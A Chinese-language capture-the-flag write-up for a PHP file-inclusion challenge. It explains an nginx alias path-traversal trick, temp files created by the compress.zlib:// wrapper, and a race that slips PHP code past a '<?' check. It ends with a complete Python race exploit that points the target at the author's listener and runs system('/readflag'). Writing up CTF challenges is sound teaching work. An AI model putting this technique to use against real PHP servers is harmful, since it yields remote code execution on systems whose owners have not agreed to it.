# inlcuder

這題 code 很短:

```php
<?php
declare(strict_types=1);

$rand_dir = 'files/'.bin2hex(random_bytes(32));
mkdir($rand_dir) || die('mkdir');
putenv('TMPDIR='.__DIR__.'/'.$rand_dir) || die('putenv');
echo 'Hello '.$_POST['name'].' your sandbox: '.$rand_dir."\n";

try {
    if (stripos(file_get_contents($_POST['file']), '<?') === false) {
        include_once($_POST['file']);
    }
}
finally {
    system('rm -rf '.escapeshellarg($rand_dir));
}
```

每次訪問會生成一個隨機的資料夾，作為tmp目錄，然後結束時會砍掉

然後我們可以指定 `file_get_contents` 的來源，如果裡面沒有 `<?`，就會去執行 `include_once`

而另外從 nginx.conf 中可以看到，`.well-known`會 alias 到 `well-known/`，所以這邊可以玩老梗: `.well-known../`

<br>

這題乍看之下沒有其他洞能利用，他還把 http upload, session 等功能直接關掉

但如果從 tmp file 這個方向去挖 php-src

會發現 `compress.zlib://` 在處理時，會生成一個暫存檔: `phpXXXXXX`，而暫存檔內容就是我們餵給他的東西

(大概是這附近: https://github.com/php/php-src/blob/5d6e923d46a89fe9cd8fb6c3a6da675aa67197b4/main/streams/cast.c#L381)

所以目標就蠻明確了:

1. 上傳一個暫存檔，內容隨便給垃圾，但連線先卡著

2. 用 `.well-known../files/xxxxxxxxxxx/` 去列目錄，得到暫存檔名

3. `file_get_contents` 讀這個暫存檔

4. 由於暫存檔內容不包含 `<?`，故通過檢查

5. 再從卡著的連線，送真正要跑的 PHP Code: `<?php system("/readflag"); ?>`

6. `include` 暫存檔時，讀到的是含 php code 的

<br>

Step 3 ~ Step 6 由於必須在`file_get_contents`和`include`兩個函數中間去塞php code，所以需要去 Race 撞他

另外有個小地方要注意，第二步驟列檔案時要先有目錄名

但一般來說，php 執行完才會輸出目錄名，而這時 `rm -rf` 已經跑完了

為了解決這個問題，可以用 php 的特性，php 在 buffer 滿的時候，會先輸出，而不會等到結束才輸出

所以我們可以利用 `$_POST['name']` ，先把 Buffer 塞滿，讓他先把 `echo 'Hello '.$_POST['name'].' your sandbox: '.$rand_dir."\n";` 這段輸出

這樣我們就能在程式結束之前，先取得資料夾名了

<br>

後面的部分就照著前面的步驟去寫腳本撞，就能拿到 flag

```python
from pwn import *
import requests
import re
import threading
import time

for gg in range(100):
    
    r = remote("78.47.165.85", 8004)
    l = listen(5278)

    payload = '''POST / HTTP/1.1
Host: 78.47.165.85:8004
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Content-Length: 8098
Content-Type: application/x-www-form-urlencoded
Connection: close
Upgrade-Insecure-Requests: 1

name={}&file=compress.zlib://http://kaibro.tw:5278'''.format("a"*8050).replace("\n","\r\n")


    r.send(payload)
    r.recvuntil("your sandbox: ")
    dirname = r.recv(70)

    print("[DEBUG]:" + dirname)

    # send trash
    c = l.wait_for_connection()
    resp = '''HTTP/1.1 200 OK
Date: Sun, 29 Dec 2019 05:22:47 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 534
Content-Type: text/html; charset=UTF-8

AAA
BBB'''.replace("\n","\r\n")
    c.send(resp)


    # get filename
    r2 = requests.get("http://78.47.165.85:8004/.well-known../"+ dirname + "/")
    tmpname = "php" + re.findall(">php(.*)<\/a",r2.text)[0]
    print("[DEBUG]:" + tmpname)

    def job():
        time.sleep(0.26)
        phpcode = 'wtf<?php system("/readflag");?>';
        c.send(phpcode)

    t = threading.Thread(target = job)
    t.start()

    # file_get_contents and include tmp file
    exp_file = dirname + "/" + tmpname
    print("[DEBUG]:"+exp_file)
    r3 = requests.post("http://78.47.165.85:8004/", data={'file':exp_file})
    print(r3.status_code,r3.text)
    if "wtf" in r3.text:
        break

    t.join()
    r.close()
    l.close()
    #r.interactive()
```

flag: `hxp{I don't care what the people say I read my php-src everyday}`

